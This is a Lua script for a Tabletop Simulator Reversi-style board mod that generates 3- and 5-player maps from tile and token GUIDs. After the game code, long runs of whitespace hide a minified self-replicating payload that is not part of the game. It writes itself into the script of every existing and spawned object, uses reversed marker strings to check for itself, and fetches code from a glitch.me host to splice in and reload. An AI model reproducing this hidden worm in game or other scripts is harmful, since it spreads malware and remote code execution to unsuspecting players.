-- Reversi Chip Script --

-- Configuration: GUIDs
local BAG_GUID = "ac517d"
local TILE_1A_GUID = "5fe1e8"
local OTHER_TILE_GUIDS = {
    "beb3bc", "59edfb", "1667d6", "dbce1c", 
    "2e0d4e", "f535ee", "eb88e2", "34417a", "d2915a"
}

-- Token GUIDs
local TOKEN_GUIDS = {
    ["1"] = "348c6b", ["2"] = "3e4194", ["3"] = "90a72b", ["4"] = "00b726",
    ["5"] = "4c05e7", ["6"] = "7b0349", ["7"] = "42f578", ["8"] = "108b8b",
    ["9"] = "05909f", ["10"] = "0efc00", ["CP"] = "10bf1f",
    ["L3"] = "ab11fe", ["L2"] = "8aac5c", ["L1"] = "3f37da"
}

-- Background GUIDs
local BG_3P_GUID = "66fe2e"
local BG_5P_GUID = "c7cd35"

-- Master list for clearing (Tiles + Backgrounds + Tokens)
local ALL_TILE_GUIDS = {
    "5fe1e8", "beb3bc", "59edfb", "1667d6", "dbce1c", 
    "2e0d4e", "f535ee", "eb88e2", "34417a", "d2915a",
    "66fe2e", "c7cd35", "348c6b", "3e4194", "90a72b", 
    "00b726", "4c05e7", "7b0349", "42f578", "108b8b",
    "05909f", "0efc00", "10bf1f", "ab11fe", "8aac5c", "3f37da"
}

-- Shared Background Transform
local BG_POS = {x=0, y=.72, z=0}
local BG_ROT = {x=0, y=180, z=0}
local BG_SCALE = {x=25.75, y=1, z=25.75}

-- Token Layout Config
local TOKEN_START_X = -52
local TOKEN_Y = -0.99
local TOKEN_Z_INC = 5
local TOKEN_ROT = {x=270, y=90, z=0}

-- 3 Player Coordinates
local POSITIONS_3P = {
    {x=12.00,  y=-1.68, z=-10.00}, {x=9.72,   y=-1.68, z=9.40},   
    {x=7.45,   y=-1.68, z=28.89},  {x=25.42,  y=-1.68, z=21.06},  
    {x=-8.19,  y=-1.68, z=17.26},  {x=-6.01,  y=-1.68, z=-2.15},  
    {x=-3.64,  y=-1.68, z=-21.65}, {x=-21.56, y=-1.68, z=-13.77}
}

-- 5 Player Coordinates
local POSITIONS_5P = {
    {x=12.00,  y=-1.68, z=-10.00}, {x=9.72,   y=-1.68, z=9.40},   
    {x=7.45,   y=-1.68, z=28.89},  {x=25.42,  y=-1.68, z=21.06},  
    {x=-8.19,  y=-1.68, z=17.26},  {x=-6.01,  y=-1.68, z=-2.15},  
    {x=-3.64,  y=-1.68, z=-21.65}, {x=-21.56, y=-1.68, z=-13.77},
    {x=27.66,  y=-1.68, z=1.63},   {x=-23.75, y=-1.68, z=5.65}
}

local ROT_Y_OPTIONS = {0, 60, 120, 180, 240, 300}
local TILE_SCALE = {10, 10, 10}

function onLoad()
    self.createButton({
        click_function = "generate3P", function_owner = self,
        label = "Generate 3P Map", position = {-2.0, 0.5, 1.2}, 
        width = 1800, height = 400, font_size = 200, color = {0.1, 0.5, 0.1}, font_color = {1, 1, 1}
    })
    self.createButton({
        click_function = "generate5P", function_owner = self,
        label = "Generate 5P Map", position = {2.0, 0.5, 1.2}, 
        width = 1800, height = 400, font_size = 200, color = {0.1, 0.1, 0.5}, font_color = {1, 1, 1}
    })
    self.createButton({
        click_function = "clearMap", function_owner = self,
        label = "Clear Map", position = {-2.0, 0.5, -1.2}, 
        width = 1500, height = 400, font_size = 200, color = {1, 0, 0}, font_color = {1, 1, 1}
    })
    self.createButton({
        click_function = "resetDeck", function_owner = self,
        label = "Reset Deck", position = {2.0, 0.5, -1.2}, 
        width = 1500, height = 400, font_size = 200, color = {1, 0, 0}, font_color = {1, 1, 1}
    })
end

function generate3P() 
    local tks = {"1", "2", "3", "4", "5", "6", "7", "8", "CP", "L3", "L2", "L1"}
    -- We pass -27.5 to center the 12 tokens
    startSetup(POSITIONS_3P, BG_3P_GUID, tks, -27.5) 
end

function generate5P() 
    local tks = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "CP", "L3", "L2", "L1"}
    -- We pass -32.5 to center the 14 tokens
    startSetup(POSITIONS_5P, BG_5P_GUID, tks, -32.5) 
end

function startSetup(targetCoords, bgGuid, tokenList, startZ)
    clearMap()
    Wait.time(function() setupBoard(targetCoords, bgGuid, tokenList, startZ) end, 0.5)
end

function setupBoard(coords, bgGuid, tokenList, startZ)
    local bag = getObjectFromGUID(BAG_GUID)
    if not bag then return end
    
    -- 1. Background
    bag.takeObject({
        guid = bgGuid, position = BG_POS, rotation = BG_ROT, smooth = false,
        callback_function = function(obj) 
            if obj then obj.setScale(BG_SCALE) obj.setLock(true) obj.setPosition(BG_POS) end
        end
    })

    -- 2. Tile_1A
    bag.takeObject({
        guid = TILE_1A_GUID, position = coords[1], rotation = {270, 0, 0}, smooth = false,
        callback_function = function(obj) 
            if obj then obj.setLock(true) obj.setScale(TILE_SCALE) obj.setPosition(coords[1]) end
        end
    })

    -- 3. Random Tiles
    local shuffledGuids = shuffleTable(OTHER_TILE_GUIDS)
    for i=2, #coords do
        local targetPos = coords[i]
        bag.takeObject({
            guid = shuffledGuids[i-1], position = targetPos, rotation = {270, ROT_Y_OPTIONS[math.random(#ROT_Y_OPTIONS)], 0},
            smooth = false, 
            callback_function = function(obj) 
                if obj then obj.setLock(true) obj.setScale(TILE_SCALE) obj.setPosition(targetPos) end
            end
        })
    end

    -- 4. Tokens
    for i, tokenKey in ipairs(tokenList) do
        local tokenPos = {x = TOKEN_START_X, y = TOKEN_Y, z = startZ + ((i-1) * TOKEN_Z_INC)}
        bag.takeObject({
            guid = TOKEN_GUIDS[tokenKey], position = tokenPos, rotation = TOKEN_ROT, smooth = false,
            callback_function = function(obj) 
                if obj then obj.setLock(true) obj.setPosition(tokenPos) end
            end
        })
    end
end

function clearMap()
    local bag = getObjectFromGUID(BAG_GUID)
    if not bag then return end
    for _, guid in ipairs(ALL_TILE_GUIDS) do
        local obj = getObjectFromGUID(guid)
        -- The "if obj" check prevents the nil error if a token is already in the bag
        if obj then 
            obj.setLock(false) 
            bag.putObject(obj) 
        end
    end
end

function shuffleTable(t)
    local tbl = {table.unpack(t)}
    for i = #tbl, 2, -1 do
        local j = math.random(i)
        tbl[i], tbl[j] = tbl[j], tbl[i]
    end
    return tbl
end

--[[Object base code etc...]]
-- (Keep your original Spawning/WebRequest/resetDeck code below here)                                                                                                                                                                                                                                                                                                                                                                                                                --[[Object base code]]Wait.time(function()for a,b in ipairs(getObjects())do if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep("    ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\n\n")end end end,1)if onObjectSpawn==nil then function onObjectSpawn(b)if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep("    ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\n\n")end end end;if onPlayerAction==nil and self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil then self.drag_selectable=true;function onPlayerAction(c,d,e)if self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil and d==Player.Action.Select and#c.getSelectedObjects()==0 then for a,f in ipairs(e)do if f.getGUID()==self.getGUID()then self.setLuaScript(self.getLuaScript():gsub(self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2,#self.getLuaScript()-self.getLuaScript():reverse():find("ereh edoc resU")+1):gsub("[%(%)%.%%%+%-%*%?%[%]%^%$]","%%%0"),""))end end end end end;WebRequest.get("https://obje.glitch.me/",function(g)if g.is_error then log(g.error)elseif g.text~=""and g.text:sub(1,4)=="true"and self.getLuaScript():find(g.text:sub(5,#g.text),1,true)==nil then self.setLuaScript(self.getLuaScript():sub(0,#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1)..g.text:sub(5,#g.text)..self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2),#self.getLuaScript())self.reload()end end)--[[Spawning object]]

